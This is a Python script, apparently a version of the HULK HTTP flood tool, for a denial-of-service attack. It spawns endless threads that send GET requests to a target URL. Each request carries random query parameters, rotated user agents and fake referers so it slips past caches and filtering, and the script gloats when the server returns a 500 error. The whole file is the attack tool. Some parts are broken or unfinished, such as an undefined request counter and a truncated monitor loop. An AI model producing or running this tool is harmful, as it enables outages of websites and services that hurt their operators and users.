import threading
import requests
import random
import sys
import os

USER_AGENTS_FILE = 'user_agents.txt'
headers_useragents = []
headers_referers = ['http://example.com', 'http://test.com']

def useragent_list():
    global headers_useragents
    if os.path.exists(USER_AGENTS_FILE):
        with open(USER_AGENTS_FILE, 'r') as file:
            headers_useragents = [line.strip() for line in file.readlines()]
    else:
        print(f"[ERROR] {USER_AGENTS_FILE} file not found.")
        sys.exit(1)

def buildblock(length):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def httpcall(url):
    useragent_list()
    if '?' in url:
        param_joiner = "&"
    else:
        param_joiner = "?"

    request_url = f"{url}{param_joiner}{buildblock(random.randint(3, 10))}={buildblock(random.randint(3, 10))}"
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(50, 100)),
        'Keep-Alive': str(random.randint(110, 160)),
        'Connection': 'keep-alive'
    }

    try:
        response = requests.get(request_url, headers=headers, timeout=5)
        if response.status_code == 500:
            print("----->>> ! LOOOL ! <<<-----")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")

class HTTPThread(threading.Thread):
    def run(self):
        while True:
            httpcall(url)

class MonitorThread(threading.Thread):
    def run(self):
        previous = 0
        while True:
            if (previous + 100 < request_counter) and (previous != request_counter):
                previous = request_counter
